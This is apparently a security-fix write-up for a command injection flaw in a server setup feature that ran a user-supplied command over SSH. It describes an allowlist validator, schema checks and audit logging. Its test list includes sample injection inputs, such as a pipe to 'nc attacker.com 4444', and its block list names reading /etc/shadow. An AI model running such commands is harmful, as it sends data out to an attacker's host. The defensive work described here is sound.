# Security Fix: Command Injection Vulnerability in Server Setup

## Vulnerability Description

A command injection vulnerability was identified in the server setup functionality where user-configurable `server.command` field was executed verbatim over SSH without validation or escaping, allowing potential arbitrary command execution on target hosts.

## Affected Components

- `packages/server/src/setup/server-setup.ts` - Server setup execution
- `packages/server/src/db/schema/server.ts` - Database schema and validation
- `apps/dokploy/components/dashboard/settings/servers/edit-script.tsx` - UI component

## Fix Implementation

### 1. Command Validation Function (`server-setup.ts`)

A new `validateServerCommand()` function has been added that implements:

- **Allowlist Approach**: Only commands matching predefined safe patterns are allowed
- **Pattern Matching**: Commands must start with recognized safe patterns:
  - Default setup script pattern: `^set -e;\s*DOCKER_VERSION=`
  - Shebang scripts: `^#!/`
- **Dangerous Pattern Detection**: Blocks potentially dangerous command sequences:
  - Arbitrary command chaining (`&&`)
  - Command substitution with unsafe commands
  - Backtick execution
  - Unsafe piping
  - File descriptor manipulation
  - Access to sensitive files (`/etc/passwd`, `/etc/shadow`)
  - Dangerous rm operations
- **Context-Aware Analysis**: Allows safe patterns within legitimate scripting contexts

### 2. Schema-Level Validation (`server.ts`)

Added `validateCommandSafety()` function to the Zod schema that:

- Validates commands before they are stored in the database
- Provides clear error messages when invalid commands are rejected
- Uses the same allowlist approach as runtime validation

### 3. Audit Logging

Added comprehensive audit logging:

- Logs all command execution attempts with server details
- Logs validation failures with error details
- Helps with security monitoring and incident response

### 4. User Interface Updates

Updated the UI component to:

- Inform users about security validation
- Explain that custom commands must match safe patterns
- Warn about command injection prevention

## Security Properties

The fix provides defense-in-depth with multiple layers:

1. **Input Validation**: Rejects unsafe commands at the API level
2. **Runtime Validation**: Re-validates commands before execution
3. **Allowlist-Based**: Only known-safe command patterns are permitted
4. **Audit Trail**: All command execution is logged for monitoring
5. **User Notification**: Clear error messages guide users to safe usage

## Backward Compatibility

- Empty or missing commands default to the safe default command
- The default command continues to work without changes
- Legitimate custom setup scripts following safe patterns are still supported
- Invalid commands are rejected with clear error messages

## Testing Recommendations

1. Test default command execution works correctly
2. Verify malicious command patterns are rejected:
   - Command injection attempts (`; malicious-command`)
   - Backtick execution (`` `malicious-command` ``)
   - Command substitution (`$(malicious-command)`)
   - Unsafe piping (`command | nc attacker.com 4444`)
3. Ensure legitimate custom scripts following safe patterns work
4. Verify error messages are clear and actionable
5. Check audit logs are generated correctly

## Remediation Steps

1. ✅ Add command validation function with allowlist approach
2. ✅ Implement schema-level validation
3. ✅ Add audit logging for command execution
4. ✅ Update UI to inform users about security controls
5. ✅ Document the security fix

## Future Enhancements

Consider these additional security improvements:

1. **Template System**: Implement a structured template system for custom setup scripts
2. **Variable Substitution**: Allow safe variable substitution instead of arbitrary commands
3. **Script Library**: Provide pre-approved scripts users can select from
4. **Enhanced Logging**: Add more detailed logging including command hashes
5. **Rate Limiting**: Limit how often commands can be executed
6. **Multi-Factor Auth**: Require additional authentication for custom commands
